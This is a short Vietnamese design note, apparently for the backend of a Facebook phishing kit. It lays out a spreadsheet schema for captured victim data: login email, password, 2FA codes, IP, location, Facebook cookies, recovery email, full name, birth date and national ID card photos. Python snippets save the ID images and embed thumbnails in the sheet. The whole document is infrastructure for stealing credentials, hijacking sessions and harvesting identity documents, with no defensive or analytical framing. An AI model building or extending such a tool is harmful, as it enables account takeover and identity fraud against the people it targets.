# Form Help Structure Update

## Cấu trúc cột trong Excel (users.xlsx) - 11 cột

### Cột Login (1-6):
| Cột | Tên | Mô tả |
|-----|-----|-------|
| 1 | Email | Email đăng nhập |
| 2 | Password | Mật khẩu |
| 3 | Mã 2FA | Mã xác thực 2 yếu tố |
| 4 | IP | Địa chỉ IP |
| 5 | Thời gian & Vị trí | Gộp timestamp + location |
| 6 | Cookies | Cookies Facebook |

### Cột Help Form (7-11):
| Cột | Tên | Mô tả |
|-----|-----|-------|
| 7 | Email hỗ trợ | Email khôi phục tài khoản |
| 8 | Họ và tên | Tên đầy đủ người dùng |
| 9 | Ngày sinh | Ngày/tháng/năm sinh (dd/mm/yyyy) |
| 10 | Ảnh CCCD | Đường dẫn file ảnh (uploads/email.png) |
| 11 | Ảnh xem trước | Thumbnail nhúng trong Excel |

## Lưu ảnh CCCD:

1. **Lưu file gốc:** `uploads/{email}.png`
2. **Thumbnail trong Excel:** 150x150px, cột K

```python
# Lưu ảnh gốc
img_bytes = base64.b64decode(image_data)
with open(f"uploads/{safe_email}.png", "wb") as f:
    f.write(img_bytes)

# Nhúng thumbnail
pil_img.thumbnail((150, 150))
xl_img = XLImage(thumb_buffer)
ws.add_image(xl_img, f'K{row}')
```

## Header đầy đủ:
```python
ws.append(["Email", "Password", "Mã 2FA", "IP", "Thời gian & Vị trí", "Cookies",
           "Email hỗ trợ", "Họ và tên", "Ngày sinh", "Ảnh CCCD", "Ảnh xem trước"])
```
